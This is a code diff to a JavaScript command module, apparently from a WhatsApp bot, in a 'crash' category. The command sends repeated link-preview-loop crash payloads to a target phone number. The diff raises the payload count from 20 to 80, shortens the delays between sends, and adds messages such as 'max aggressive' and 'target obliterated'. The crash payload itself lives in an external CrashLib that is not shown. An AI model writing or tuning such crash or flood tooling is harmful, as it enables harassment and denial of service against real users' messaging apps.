@@ -6,7 +6,7 @@ module.exports = {
     name: 'preview',
     aliases: ['linkpreview', 'previewloop'],
     category: 'crash',
-    desc: 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ',
+    desc: 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
     usage: '.preview <number>',
     waitReact: true,
 
@@ -27,17 +27,17 @@ module.exports = {
             crashLib = new CrashLib(sock);
         }
         
-        const TOTAL = 20;
+        const TOTAL = 80;
         const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
         
         try {
             for (let i = 0; i < TOTAL; i++) {
                 await crashLib.linkPreviewLoop(target, msg);
                 await bar.update(1, 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ');
-                await new Promise(r => setTimeout(r, 400));
+                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
             }
             
-            await bar.done(`✅ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
+            await bar.done(`✅ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
         } catch (e) {
             await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
         }
